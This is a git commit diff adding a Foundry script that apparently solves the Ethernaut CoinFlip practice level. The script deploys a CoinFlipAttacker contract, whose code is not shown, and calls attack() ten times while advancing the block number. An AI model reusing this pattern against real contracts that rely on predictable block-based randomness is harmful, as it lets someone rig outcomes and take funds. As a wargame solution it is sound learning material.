010a570885a8700a3f1df1f1b668b5a81b3519aa
Tanner Ang <ang713943@gmail.com>
2024-01-17 00:02:49 +0800

    complete 03-CoinFlip

--- script/solutions/03-CoinFlip.s.sol
+++ script/solutions/03-CoinFlip.s.sol
@@ -5,6 +5,7 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
+import {CoinFlipAttacker} from "../../src/03-CoinFlipAttacker.sol";
 
 contract CoinFlipSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF;
@@ -15,9 +16,16 @@ contract CoinFlipSolution is Script, EthernautHelper {
         // NOTE this is the address of your challenge contract
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
-        // YOUR SOLUTION HERE
+        // YOUR SOLUTION HERE 
+        CoinFlipAttacker coinFlipAttacker = new CoinFlipAttacker(challengeInstance);
+        uint256 height = 100;
+        vm.roll(height);
 
-
+        for (uint i = 0; i < 10; i++) {
+            height += 1;
+            vm.roll(height);
+            coinFlipAttacker.attack();
+        }
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
